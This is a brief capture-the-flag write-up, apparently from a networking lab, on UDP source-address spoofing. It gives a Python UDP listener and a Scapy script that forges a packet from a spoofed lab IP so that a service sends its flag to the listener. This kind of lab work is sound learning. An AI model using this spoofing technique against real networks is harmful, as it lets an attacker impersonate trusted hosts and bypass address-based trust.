# UDP Spoofing 2

#### Have to basically do the same thing just change the message and add a listener to get the flag. Netcat is super easy in combo with python or scapy but I chose to do poth via python. First created a listener: 
```python
import sys, socket

UDP_IP = "10.0.0.1" # Listen on all available interfaces
UDP_PORT = 4444   # The port you used as dport in your Scapy script

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    sock.bind((UDP_IP, UDP_PORT))
    print(f"[*] Python UDP Listener on {UDP_IP}:{UDP_PORT}")
except socket.error as e:
    print(f"[*] Bind failed: {e}")
    sys.exit(1)

print("[*] Waiting for UDP data...")

while True:
    # Receive data and the address of the sender
    data, addr = sock.recvfrom(4096) 
    print(f"\n[+] Received connection from: {addr[0]}:{addr[1]}")
    print(f"[+] Message: {data.decode('utf-8').strip()}")
```

------------------------------------------------

#### Then use the same script from the other challenge adjusted for this one:

```python
from scapy.all import IP, UDP, sr1, Raw

src_ip = "10.0.0.3"
sport = 31337
dst_ip = "10.0.0.2"
dport = 31338
msg = "FLAG:10.0.0.1:4444"

packet = IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=dport) / msg

print(f"Sending packet: {packet.summary()}")

response = sr1(packet, timeout=5, verbose=0)

if response:
    response.show() 
    if Raw in response:
        print(f"\nResponse: {response[Raw].load.decode('utf-8')}")
else:
    print("\nNo response received.")
```

<img width="465" height="136" alt="Screenshot 2025-11-05 125359" src="https://github.com/user-attachments/assets/f0a7f399-86eb-4100-b658-f3fd2c52c24f" />
